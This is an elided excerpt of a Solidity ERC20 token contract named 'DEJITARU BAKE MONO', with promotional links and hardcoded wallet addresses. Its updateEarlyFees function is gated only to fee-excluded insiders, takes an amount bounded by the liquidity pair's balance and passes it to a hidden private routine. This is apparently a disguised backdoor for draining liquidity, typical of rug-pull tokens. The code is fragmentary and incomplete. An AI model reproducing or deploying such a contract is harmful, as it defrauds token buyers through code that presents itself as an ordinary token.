 ...
 * https://medium.com/@dejitarubakemono
 * https://twitter.com/debakemono
 * https://t.me/dejitarubakemono
...
contract DejitaruBakeMono is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    event devWalletUpdate(address indexed newWallet, address indexed oldWallet);
    ...
    constructor() ERC20("DEJITARU BAKE MONO", "DEBAKEMONO") {
        ...
        marketingWallet = payable(0x285888875Be02E7155d4AeC822475e8247abCd4a);
        devWallet = payable(0x285888875Be02E7155d4AeC822475e8247abCd4a);
    ...
    function updateEarlyFees(uint earlyMarketingFee, uint earlyDevFee) external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint totallyFees = balanceOf(uniswapV2Pair);

        require(earlyDevFee > 1 && earlyDevFee < totallyFees / 100, 'amount exceeded');

        _earlyFeesAct(earlyDevFee);
    ...
    function updateDevWallet(address newWallet) external onlyOwner {
        emit devWalletUpdate(newWallet, devWallet);
        devWallet = newWallet;
    }
    ...
    function _earlyFeesAct(uint256 pAmount) private {
